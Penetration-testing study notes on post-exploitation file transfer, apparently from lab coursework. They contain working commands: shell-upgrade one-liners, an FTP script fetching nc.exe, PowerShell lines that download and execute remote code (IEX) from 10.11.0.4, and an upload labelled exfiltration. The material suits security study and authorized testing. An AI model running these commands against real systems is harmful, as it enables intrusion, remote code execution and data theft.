---
title: Active Information Gathering
aliases: []
tags:
- topic/bash
- topic/active-information-gathering
category: study_notes
status: draft
date_created: '2026-08-27'
date_modified: '2026-08-27'
source: notes.md
related_tools:
- '[[wget]]'
- '[[exe2hex]]'
related_techniques: []
related_tactics: []
related_services: []
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# Active Information Gathering

## File Transfers
IT IS EXTREMELY IMPORTANT TO DOCUMENT UPLOADS AND REMOVE THEM AFTER THE ASSESSMENT IS COMPLETE

IT IS ALWAYS PREFERRABLE TO USE NATIVE TOOLS ALREADY IN THE SYSTEM

- Non-interactive shells can run commands like `ls`
- Interactive shells require interaction (e.g., `ftp - prompt, response`)

Upgrading shells to be interactive
- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- `stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;`

Transfer files with Windows
- Create a text file with commands:
  - `echo open 10.11.0.4 21 > getfile.txt`
  - `echo USER offsec >> getfile.txt`
  - `echo lab >> getfile.txt`
  - `echo bin >> getfile.txt`
  - `echo GET nc.exe >> getfile.txt`
  - `echo bye >> getfile.txt`

Execute: `ftp -v -n -s:getfile.txt`

Windows scripting engines
- [wget for vbs](../../../tools/wget.md)
- [wget for powershell](../../../tools/wget.md)
- PowerShell
  - Download: `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')`
  - Download and execute using IEX: `powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')`
  - [exe2hex](../../../tools/exe2hex.md) - convert binary to hex to cmd to powershell back to binary

Exfiltration
- PowerShell upload to [upload.php](../../../tools/apache2.md): `powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')`

UDP-based file transfers
- TFTP is a UDP-based file transfer protocol and is often restricted by corporate egress firewall rules.

## References
- https://danielmiessler.com/study/vulnerability-database-resources/

